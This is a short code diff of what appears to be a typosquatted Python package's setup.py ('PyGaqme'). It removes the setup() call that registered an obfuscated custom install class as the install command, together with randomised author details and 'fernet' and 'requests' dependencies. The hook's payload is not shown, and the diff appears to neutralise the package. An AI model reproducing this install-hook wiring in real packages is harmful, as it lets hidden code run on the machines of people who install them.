@@ -18,22 +18,5 @@ class gtKbFYtxHSoDFASDsshRWKaYUidNaQnbsuEKYJVLnZyhdjSUYDAulHxZRpFEKXSNtYxZzLPtDC
             install.run(self)
 
 
-setup(
-    name="PyGaqme",
-    version=VERSION,
-    author="ZPwbfxRY",
-    author_email="mGDkaqjKFYPF@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': gtKbFYtxHSoDFASDsshRWKaYUidNaQnbsuEKYJVLnZyhdjSUYDAulHxZRpFEKXSNtYxZzLPtDCyYifQcIuehbExBnxUkhNbPfnYBrHn,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
